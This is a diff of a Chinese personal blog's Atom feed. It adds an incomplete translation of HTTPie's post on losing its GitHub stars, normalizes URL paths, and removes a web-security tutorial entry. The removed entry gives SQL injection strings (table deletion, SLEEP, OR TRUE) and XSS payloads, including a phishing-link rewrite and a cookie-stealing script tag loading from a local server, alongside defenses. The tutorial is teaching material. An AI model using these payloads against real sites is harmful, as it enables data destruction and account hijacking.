@@ -6,7 +6,7 @@
   <link href="https://www.unohe.com/atom.xml" rel="self"/>
   
   <link href="https://www.unohe.com/"/>
-  <updated>2024-03-16T14:58:20.373Z</updated>
+  <updated>2024-03-19T02:59:02.353Z</updated>
   <id>https://www.unohe.com/</id>
   
   <author>
@@ -17,9 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>HTTPie是如何丢失5.4万Star的</title>
+    <link href="https://www.unohe.com/trans/how-we-lost-54k-github-stars/"/>
+    <id>https://www.unohe.com/trans/how-we-lost-54k-github-stars/</id>
+    <published>2024-03-18T22:05:05.000Z</published>
+    <updated>2024-03-19T02:59:02.353Z</updated>
+    
+    <content type="html"><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-bullhorn modern"><p>春天快到了！</p></div><h1>本文章来源背景</h1><p>某一天（对就是前几天），我在图书馆搜索关于FastAPI的相关书籍时，找到了《Python FastAPI构建数据科学应用》这本书。该书在2022年5月出的第一版，也是第一次印刷，虽然它已经入住图书馆两年，但好像我是这本书的第一位读者。。。</p><img src="https://s2.loli.net/2024/03/19/SzfXyiRWHcs9B7U.png" alt="对就是这本书" style="zoom:50%;" /><div class="img-alt is-center">对就是这本书。</div><p>开始读的时候我才发现，上一句话是有原因的。该书从Python基础讲起，后介绍了FastAPI作为后端框架比较基础的使用模型，在后面几章还有关于NumPy、scikit-learn、OpenCV等与主题不相干的知识（没错、和FastAPI都没有一点关系），但是我找到了一个很有趣的工具——HTTPie。</p><p>针对以前做后端接口调试和爬虫请求验证时，我一般使用Postman，但是相对HTTPie来说有些过于繁琐。即使可视化工具很好而且易于使用，但有时也会缺乏一些灵活性，不如命令行工具那么高效。另一方面，cURL是一个非常强大的工具，有数千个选项，但是对于测试简单的REST API而言，可能它会显得非常复杂和冗长。</p><p>在搜索相关资料时，我发现HTTPie还有一件“乌龙”事件：54k<span class="emoji" alias="star" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8">⭐</span>在某一夜清零了，作者表示非常懊恼，官方专门写了一篇博客来反思整件事情。本着学习的态度，我决定将原文翻译成中文，并附上一些语言的翻译链接，基于作者不高的翻译水平与空空如也的翻译经验，本篇文章翻译质量可能不及您的预期，如果你想要更为精准、更为流利的翻译请移步👇。</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://icloudnative.io/posts/how-we-lost-54k-github-stars/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">HTTPie 是如何丢失 5.4 万 Star 的</div>            <div class="tag-link-sitename"> 云原生实验室</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><div class="tip sync"><p>官方博客原文链接：<a href="https://httpie.io/blog/stardust">How we lost 54k GitHub stars</a></p></div><h1>我们是如何损失5.4万star的</h1><h2 id="获得5-4万GitHub-stars">获得5.4万GitHub stars</h2><p>HTTPie作为一个命令行工具正在庆祝第一次H提交的十周年纪念。</p><p>如果你不是非常熟悉本项目，我来向你介绍它：他是一个开源的CLI HTTP客户端。让HTTPie与众不同的是我们从零开始搭建一个让人们用起来非常舒适的API交互终端。</p><p>从第一次发布，发表在2012年2月25日的哥本哈根的雨天，我们在GitHub创建了这个项目</p><p>我是</p><h1>文章部分英文单词</h1><p>以下单词来源该博客，音标为英式发音。<a href="https://dictionary.cambridge.org/">https://dictionary.cambridge.org/</a></p><details class="folding-tag" ><summary> Copenhagen </summary>              <div class='content'>              <p><em><strong>noun</strong></em><br><strong>UK</strong>  /ˌkəʊ.pənˈheɪ.ɡən/ <strong>US</strong>  /ˌkoʊ.pənˈheɪ.ɡən/<br><strong>the capital city of Denmark, situated in the eastern part of the country</strong><br>哥本哈根（丹麦首都，位于丹麦东部）</p>              </div>            </details><details class="folding-tag" ><summary> proclaim </summary>              <div class='content'>              <p><em><strong>verb</strong></em> [ T ]<br><strong>UK</strong>  /prəˈkleɪm/ <strong>US</strong>  /proʊˈkleɪm/<br><strong>to announce something publicly or officially, especially something positive</strong><br>宣布;声明<br><em>All the countries have proclaimed their loyalty to the alliance.</em><br>所有的国家都表明了他们对联盟的忠诚。<br><em>Republican party members were confidently proclaiming victory even as the first few votes came in.</em><br>刚刚得到几张选票，共和党人就准备自信地宣布胜利了。<br><em>[ + that ] It was the famous speech in which he proclaimed that socialism was dead.</em><br>就是在那场著名的演讲中他宣称社会主义已经死亡。<br><em>[ + two objects ] She was proclaimed Queen at the age of 13 after the sudden death of her father.</em><br>父亲突然去世后，她13岁就被立为女王。</p>              </div>            </details><details class="folding-tag" ><summary> stargazer </summary>              <div class='content'>              <p><em><strong>noun</strong></em> [ C ] (also star-gazer, star gazer)<br><strong>UK</strong>  /ˈstɑːˌɡeɪ.zər/ <strong>US</strong>  /ˈstɑːrˌɡeɪ.zɚ/<br><strong>a person who is involved in astronomy or astrology</strong><br>天文学家;占星术士</p><ul><li><em>Environmentalists and stargazers both want dark skies.</em></li><li><em>Star gazers with small telescopes may be able to spot the comet on Monday night.</em></li></ul>              </div>            </details><details class="folding-tag" ><summary> percentile </summary>              <div class='content'>              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>              </div>            </details><details class="folding-tag" ><summary> magnitude </summary>              <div class='content'>              <p><em><strong>noun</strong></em> [ U ]<br><strong>UK</strong>  /ˈmæɡ.nɪ.tʃuːd/ <strong>US</strong>  /ˈmæɡ.nə.tuːd/<br><strong>the large size or importance of something</strong><br>巨大；重大，重要性<br><em>They don’t seem to grasp the magnitude of the problem.</em><br>他们似乎未领会问题的重要性。</p>              </div>            </details><details class="folding-tag" ><summary> percentile </summary>              <div class='content'>              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>              </div>            </details><details class="folding-tag" ><summary> percentile </summary>              <div class='content'>              <p><em><strong>noun</strong></em> [ C ]   MATHEMATICS, SCIENCE   specialized<br><strong>UK</strong>  /pəˈsen.taɪl/ <strong>US</strong>  /pɚˈsen.taɪl/<br><strong>one of the points into which a large range of numbers, results, etc. is divided to make 100 groups of the same size</strong><br>百分位（数）;百分位（数）之一<br><em>That score puts you in the 97th percentile.</em><br>那个分数使你处于百分位排名的第97位。</p>              </div>            </details>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;div class=&quot;note blue anzhiyufont anzhiyu-icon-bullhorn modern&quot;&gt;&lt;p&gt;春天快到了！&lt;/p&gt;
+&lt;/div&gt;
+&lt;h1&gt;本文章来源背景&lt;/h1&gt;
+&lt;p&gt;某一天（对就是前几天），我在图书馆搜索关于FastAPI的相关书籍时，</summary>
+      
+    
+    
+    
+    <category term="文章翻译" scheme="https://www.unohe.com/categories/%E6%96%87%E7%AB%A0%E7%BF%BB%E8%AF%91/"/>
+    
+    
+    <category term="Github" scheme="https://www.unohe.com/tags/Github/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Hexo主题Anzhiyu迁移记录</title>
-    <link href="https://www.unohe.com/Blog/1/"/>
-    <id>https://www.unohe.com/Blog/1/</id>
+    <link href="https://www.unohe.com/blog/1/"/>
+    <id>https://www.unohe.com/blog/1/</id>
     <published>2024-03-13T04:05:05.000Z</published>
     <updated>2024-03-16T14:58:20.373Z</updated>
     
@@ -42,8 +69,8 @@
   
   <entry>
     <title>2022大学生电子设计竞赛</title>
-    <link href="https://www.unohe.com/Competition/nuedc_3/"/>
-    <id>https://www.unohe.com/Competition/nuedc_3/</id>
+    <link href="https://www.unohe.com/competition/nuedc_3/"/>
+    <id>https://www.unohe.com/competition/nuedc_3/</id>
     <published>2023-06-17T20:05:30.000Z</published>
     <updated>2024-03-17T02:34:35.003Z</updated>
     
@@ -63,8 +90,8 @@
   
   <entry>
     <title>美国得克萨斯州2·14大停电</title>
-    <link href="https://www.unohe.com/EE/PowerOutage/"/>
-    <id>https://www.unohe.com/EE/PowerOutage/</id>
+    <link href="https://www.unohe.com/ee/PowerOutage/"/>
+    <id>https://www.unohe.com/ee/PowerOutage/</id>
     <published>2023-05-01T04:04:28.000Z</published>
     <updated>2024-03-16T09:48:29.914Z</updated>
     
@@ -89,8 +116,8 @@
   
   <entry>
     <title>2023 ICM Problem Z The Future of the Olympics</title>
-    <link href="https://www.unohe.com/Competition/ICM/"/>
-    <id>https://www.unohe.com/Competition/ICM/</id>
+    <link href="https://www.unohe.com/competition/ICM/"/>
+    <id>https://www.unohe.com/competition/ICM/</id>
     <published>2023-04-03T10:05:26.000Z</published>
     <updated>2024-03-16T09:34:10.434Z</updated>
     
@@ -114,8 +141,8 @@
   
   <entry>
     <title>2023 MCM Problem C Predicting Wordle Results</title>
-    <link href="https://www.unohe.com/Competition/MCM/"/>
-    <id>https://www.unohe.com/Competition/MCM/</id>
+    <link href="https://www.unohe.com/competition/MCM/"/>
+    <id>https://www.unohe.com/competition/MCM/</id>
     <published>2023-02-06T10:05:26.000Z</published>
     <updated>2024-03-16T09:47:50.623Z</updated>
     
@@ -160,8 +187,8 @@
   
   <entry>
     <title>2022全国大学生电子设计竞赛</title>
-    <link href="https://www.unohe.com/Competition/nuedc_2/"/>
-    <id>https://www.unohe.com/Competition/nuedc_2/</id>
+    <link href="https://www.unohe.com/competition/nuedc_2/"/>
+    <id>https://www.unohe.com/competition/nuedc_2/</id>
     <published>2022-08-04T00:05:30.000Z</published>
     <updated>2024-03-17T02:36:47.057Z</updated>
     
@@ -185,8 +212,8 @@
   
   <entry>
     <title>数据分析Demo</title>
-    <link href="https://www.unohe.com/Python/some-demo/"/>
-    <id>https://www.unohe.com/Python/some-demo/</id>
+    <link href="https://www.unohe.com/python/some-demo/"/>
+    <id>https://www.unohe.com/python/some-demo/</id>
     <published>2022-07-09T02:20:05.000Z</published>
     <updated>2024-03-16T09:53:02.541Z</updated>
     
@@ -214,8 +241,8 @@
   
   <entry>
     <title>数据分析的基础知识以及环境搭建（附Jupyter快捷键）</title>
-    <link href="https://www.unohe.com/Python/data-base/"/>
-    <id>https://www.unohe.com/Python/data-base/</id>
+    <link href="https://www.unohe.com/python/data-base/"/>
+    <id>https://www.unohe.com/python/data-base/</id>
     <published>2022-06-15T06:13:05.000Z</published>
     <updated>2024-03-16T09:50:29.516Z</updated>
     
@@ -245,8 +272,8 @@
   
   <entry>
     <title>MySQL语句</title>
-    <link href="https://www.unohe.com/Web/mysql/"/>
-    <id>https://www.unohe.com/Web/mysql/</id>
+    <link href="https://www.unohe.com/web/mysql/"/>
+    <id>https://www.unohe.com/web/mysql/</id>
     <published>2022-04-28T08:22:40.000Z</published>
     <updated>2024-03-16T09:53:51.376Z</updated>
     
@@ -272,8 +299,8 @@
   
   <entry>
     <title>拥抱FastAPI</title>
-    <link href="https://www.unohe.com/Web/fastapi/"/>
-    <id>https://www.unohe.com/Web/fastapi/</id>
+    <link href="https://www.unohe.com/web/fastapi/"/>
+    <id>https://www.unohe.com/web/fastapi/</id>
     <published>2022-04-24T09:03:37.000Z</published>
     <updated>2024-03-16T09:53:32.260Z</updated>
     
@@ -301,8 +328,8 @@
   
   <entry>
     <title>CTGU自动打卡</title>
-    <link href="https://www.unohe.com/Web/Yiqing/"/>
-    <id>https://www.unohe.com/Web/Yiqing/</id>
+    <link href="https://www.unohe.com/web/Yiqing/"/>
+    <id>https://www.unohe.com/web/Yiqing/</id>
     <published>2022-02-14T04:37:09.000Z</published>
     <updated>2024-03-16T09:54:19.762Z</updated>
     
@@ -321,9 +348,9 @@
     <category term="项目" scheme="https://www.unohe.com/categories/%E9%A1%B9%E7%9B%AE/"/>
     
     
-    <category term="Flask" scheme="https://www.unohe.com/tags/Flask/"/>
-    
     <category term="Vue" scheme="https://www.unohe.com/tags/Vue/"/>
+    
+    <category term="Flask" scheme="https://www.unohe.com/tags/Flask/"/>
     
     <category term="MySQL" scheme="https://www.unohe.com/tags/MySQL/"/>
     
@@ -331,8 +358,8 @@
   
   <entry>
     <title>JS混淆与反混淆</title>
-    <link href="https://www.unohe.com/JavaScript/JsCoder/"/>
-    <id>https://www.unohe.com/JavaScript/JsCoder/</id>
+    <link href="https://www.unohe.com/javascript/JsCoder/"/>
+    <id>https://www.unohe.com/javascript/JsCoder/</id>
     <published>2022-01-25T11:57:33.000Z</published>
     <updated>2024-03-16T09:48:55.224Z</updated>
     
@@ -362,8 +389,8 @@
   
   <entry>
     <title>常见加密方式</title>
-    <link href="https://www.unohe.com/Python/Coder/"/>
-    <id>https://www.unohe.com/Python/Coder/</id>
+    <link href="https://www.unohe.com/python/Coder/"/>
+    <id>https://www.unohe.com/python/Coder/</id>
     <published>2022-01-25T10:57:33.000Z</published>
     <updated>2024-03-16T10:07:17.069Z</updated>
     
@@ -390,8 +417,8 @@
   
   <entry>
     <title>Ajax介绍</title>
-    <link href="https://www.unohe.com/Web/Ajax/"/>
-    <id>https://www.unohe.com/Web/Ajax/</id>
+    <link href="https://www.unohe.com/web/Ajax/"/>
+    <id>https://www.unohe.com/web/Ajax/</id>
     <published>2022-01-25T04:37:09.000Z</published>
     <updated>2024-03-16T09:53:13.271Z</updated>
     
@@ -418,8 +445,8 @@
   
   <entry>
     <title>Javascript基础知识</title>
-    <link href="https://www.unohe.com/JavaScript/JavaScript-Base/"/>
-    <id>https://www.unohe.com/JavaScript/JavaScript-Base/</id>
+    <link href="https://www.unohe.com/javascript/JavaScript-Base/"/>
+    <id>https://www.unohe.com/javascript/JavaScript-Base/</id>
     <published>2022-01-25T00:57:33.000Z</published>
     <updated>2024-03-16T09:57:46.759Z</updated>
     
@@ -448,8 +475,8 @@
   
   <entry>
     <title>Vue</title>
-    <link href="https://www.unohe.com/Web/Vue/"/>
-    <id>https://www.unohe.com/Web/Vue/</id>
+    <link href="https://www.unohe.com/web/Vue/"/>
+    <id>https://www.unohe.com/web/Vue/</id>
     <published>2022-01-08T11:05:30.000Z</published>
     <updated>2024-03-16T09:54:11.900Z</updated>
     
@@ -477,8 +504,8 @@
   
   <entry>
     <title>Pyside2封装爬虫程序</title>
-    <link href="https://www.unohe.com/Python/pythonwebcatch-pyside2/"/>
-    <id>https://www.unohe.com/Python/pythonwebcatch-pyside2/</id>
+    <link href="https://www.unohe.com/python/pythonwebcatch-pyside2/"/>
+    <id>https://www.unohe.com/python/pythonwebcatch-pyside2/</id>
     <published>2021-11-24T11:43:26.000Z</published>
     <updated>2024-03-16T09:51:59.035Z</updated>
     
@@ -500,8 +527,8 @@
   
   <entry>
     <title>2021大学生电子设计竞赛</title>
-    <link href="https://www.unohe.com/Competition/nuedc_1/"/>
-    <id>https://www.unohe.com/Competition/nuedc_1/</id>
+    <link href="https://www.unohe.com/competition/nuedc_1/"/>
+    <id>https://www.unohe.com/competition/nuedc_1/</id>
     <published>2021-11-09T12:05:30.000Z</published>
     <updated>2024-03-17T02:36:28.689Z</updated>
     
@@ -520,36 +547,6 @@
     
     
     <category term="NUEDC" scheme="https://www.unohe.com/tags/NUEDC/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Web安全</title>
-    <link href="https://www.unohe.com/Web/Permeate/"/>
-    <id>https://www.unohe.com/Web/Permeate/</id>
-    <published>2021-09-18T11:05:30.000Z</published>
-    <updated>2024-03-16T09:54:01.797Z</updated>
-    
-    <content type="html"><![CDATA[<div align="center"><h3>SQL</h3></div><h4 id="SQL简单介绍">SQL简单介绍</h4><ul><li>SQL 指结构化查询语言，全称是 Structured Query Language。</li><li>SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。</li><li>SQL 在1986年成为 ANSI（American National Standards Institute 美国国家标准化组织）的一项标准，在 1987 年成为国际标准化组织（ISO）标准。</li></ul><h4 id="SQL注入流程：">SQL注入流程：</h4><ol><li>sql注入的原理以及sqllite数据库</li><li>sqlite的安装以及基本语句</li><li>结合靶场理解sqlite的注入流程</li></ol><h4 id="SQL注入简介">SQL注入简介</h4><p>SQL注入是网站存在最多也是最简单的漏洞，主要原因是程序对用户输入的字符串没有进行过滤或处理不严谨。至今SQL注入仍然是首要的难以修复的安全漏洞。</p><h4 id="SQL注入的原理">SQL注入的原理</h4><p>SQL 注入的原理主要有以下 4 点：</p><h5 id="1）恶意拼接查询">1）恶意拼接查询</h5><p>我们知道，SQL 语句可以查询、插入、更新和删除数据，且使用分号来分隔不同的命令。例如：</p><p><code>SELECT * FROM users WHERE user_id = $user_id</code></p><p>其中，user_id 是传入的参数，如果传入的参数值为“1234; DELETE FROM users”，那么最终的查询语句会变为：</p><p><code>SELECT * FROM users WHERE user_id = 1234; DELETE FROM users</code></p><p>如果以上语句执行，则会删除 users 表中的所有数据。</p><h5 id="2）利用注释执行非法命令。">2）利用注释执行非法命令。</h5><p>SQL 语句中可以插入注释。例如：</p><p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version=$version</code></p><p>如果 version 包含了恶意的字符串<code>'-1' OR 3 AND SLEEP(500)--</code>，那么最终查询语句会变为：</p><p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version='-1' OR 3 AND SLEEP(500)--</code></p><p>以上恶意查询只是想耗尽系统资源，SLEEP(500) 将导致 SQL 语句一直运行。如果其中添加了修改、删除数据的恶意指令，那么将会造成更大的破坏。</p><h5 id="3）传入非法参数">3）传入非法参数</h5><p>SQL 语句中传入的字符串参数是用单引号引起来的，如果字符串本身包含单引号而没有被处理，那么可能会篡改原本 SQL 语句的作用。 例如：</p><p><code>SELECT * FROM user_name WHERE user_name = $user_name</code></p><p>如果 user_name 传入参数值为 G’chen，那么最终的查询语句会变为：</p><p><code>SELECT * FROM user_name WHERE user_name ='G'chen'</code></p><p>一般情况下，以上语句会执行出错，这样的语句风险比较小。虽然没有语法错误，但可能会恶意产生 SQL 语句，并且以一种你不期望的方式运行。</p><h5 id="4）添加额外条件">4）添加额外条件</h5><p>在 SQL 语句中添加一些额外条件，以此来改变执行行为。条件一般为真值表达式。例如：</p><p><code>UPDATE users SET userpass='$userpass' WHERE user_id=$user_id;</code></p><p>如果 user_id 被传入恶意的字符串“1234 OR TRUE”，那么最终的 SQL 语句会变为：</p><p><code>UPDATE users SET userpass= '123456' WHERE user_id=1234 OR TRUE;</code></p><p>这将更改所有用户的密码。</p><h4 id="避免SQL注入">避免SQL注入</h4><p>对于 SQL 注入，我们可以采取适当的预防措施来保护数据安全。下面是避免 SQL 注入的一些方法。</p><h5 id="1-过滤输入内容，校验字符串">1. 过滤输入内容，校验字符串</h5><p>过滤输入内容就是在数据提交到数据库之前，就把用户输入中的不合法字符剔除掉。可以使用编程语言提供的处理函数或自己的处理函数来进行过滤，还可以使用正则表达式匹配安全的字符串。</p><p>如果值属于特定的类型或有具体的格式，那么在拼接 SQL 语句之前就要进行校验，验证其有效性。比如对于某个传入的值，如果可以确定是整型，则要判断它是否为整型，在浏览器端（客户端）和服务器端都需要进行验证。</p><h5 id="2-参数化查询">2. 参数化查询</h5><p>参数化查询目前被视作是预防 SQL 注入攻击最有效的方法。参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。</p><p>MySQL 的参数格式是以“?”字符加上参数名称而成，如下所示：</p><p><code>UPDATE myTable SET c1 = ?c1, c2 = ?c2, c3 = ?c3 WHERE c4 = ?c4</code></p><p>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为 SQL 语句的一部分来进行处理，而是在数据库完成 SQL 语句的编译之后，才套用参数运行。因此就算参数中含有破坏性的指令，也不会被数据库所运行。</p><h5 id="3-安全测试、安全审计">3. 安全测试、安全审计</h5><p>除了开发规范，还需要合适的工具来确保代码的安全。我们应该在开发过程中应对代码进行审查，在测试环节使用工具进行扫描，上线后定期扫描安全漏洞。通过多个环节的检查，一般是可以避免 SQL 注入的。</p><p>有些人认为存储过程可以避免 SQL 注入，存储过程在传统行业里用得比较多，对于权限的控制是有一定用处的，但如果存储过程用到了动态查询，拼接 SQL，一样会存在安全隐患。</p><h4 id="方法">方法</h4><h5 id="1-避免使用动态SQL">1. 避免使用动态SQL</h5><p>避免将用户的输入数据直接放入 SQL 语句中，最好使用准备好的语句和参数化查询，这样更安全。</p><h5 id="2-不要将敏感数据保留在纯文本中">2. 不要将敏感数据保留在纯文本中</h5><p>加密存储在数据库中的私有/机密数据，这样可以提供了另一级保护，以防攻击者成功地排出敏感数据。</p><h5 id="3-限制数据库权限和特权">3. 限制数据库权限和特权</h5><p>将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。</p><h5 id="4-避免直接向用户显示数据库错误">4. 避免直接向用户显示数据库错误</h5><p>攻击者可以使用这些错误消息来获取有关数据库的信息。</p><p>一些编程框架对于写出更安全的代码也有一定的帮助，因为它提供了一些处理字符串的函数和使用查询参数的方法。但同样，你仍然可以编写出不安全的 SQL 语句。所以归根到底，我们需要有良好的编码规范，并能充分利用参数化查询、字符串处理和参数校验等多种办法来保护数据库和程序的安全。</p><div align="center"><h3>XSS</h3></div><h4 id="XSS的简单介绍">XSS的简单介绍</h4><ul><li>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户目的。</li><li>XSS危害：<ul><li>流量劫持</li><li>获取用户cookie信息，盗取账号</li><li>篡改、删除页面信息（钓鱼）</li><li>配合CSRF攻击，实施进一步攻击</li></ul></li><li>XSS分类<ul><li>反射型XSS：反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。</li><li>存储型XSS：存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</li><li>DOM型：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</li></ul></li></ul><h4 id="一、钓鱼指向">一、钓鱼指向</h4><p>在用户名框中输入<code>&lt;script&gt;alert(2)&lt;/script&gt;</code>(闭合input标签)，界面弹窗，证明该系统存在XSS注入。上一步验证得出，该页面存在XSS漏洞。接下来针对该漏洞进行修改链接属性实现跳转到钓鱼界面</p><p>在username=后面加上<code>&lt;script&gt;document.getElementsByTagName(&quot;body&quot;)[0].onload=function changeLink()&#123;document.getElementById(&quot;myId&quot;).href='http://127.0.0.1:8082/wjmm.php';&#125;&lt;/script&gt;</code>（修改忘记密码a标签的href，使其指向钓鱼网站）收到cookie后，手动给浏览器添加对应cookie，实现伪造管理员（用户）登录</p><h4 id="二、盗取Cookie">二、盗取Cookie</h4><p>将js代码<code>&lt;/textarea&gt;'&quot;&gt;&lt;script src=http://127.0.0.1:8081/xss/cGMiSw?1555397544&gt;&lt;/script&gt;</code> 发表在文章管理系统的留言板上（该地址指向存放接收信息的服务器上的js路径）</p><p>当后台管理员审核留言（或者其他用户查看到该留言）时，触发页面执行js脚本，将浏览器的cookie发送到接收服务器</p><h4 id="XSS防范">XSS防范</h4><ul><li>XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</li><li>修复和防范方法：<ul><li>三种类型的XSS漏洞都可以通过过滤或编码进行修复。</li><li>反射型XSS和存储型XSS可以在服务端对用户输入输出的内容过滤和编码操作，将关键字进行过滤处理，关键符号进行编码处理，如将所有on事件,script等关键字进行过滤，将所有&lt;,&gt;,”,’,=等特殊符号进行实体化编码或url编码便可以修复。</li><li>DOM型XSS如有在服务端进行交互，也可参考上述的方法进行修复，如未和服务端进行交互，可在客户端使用JavaScript等客户端脚本语言进行编码和过滤处理。</li></ul></li></ul><h3 id="待续…">待续…</h3>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;div align=&quot;center&quot;&gt;&lt;h3&gt;SQL&lt;/h3&gt;&lt;/div&gt;
-&lt;h4 id=&quot;SQL简单介绍&quot;&gt;SQL简单介绍&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;SQL 指结构化查询语言，全称是 Structured Query Language。&lt;/li&gt;
-&lt;li&gt;SQL 让您可以访</summary>
-      
-    
-    
-    
-    <category term="网络安全" scheme="https://www.unohe.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
-    
-    <category term="SQL" scheme="https://www.unohe.com/tags/SQL/"/>
-    
-    <category term="XSS" scheme="https://www.unohe.com/tags/XSS/"/>
     
   </entry>
   
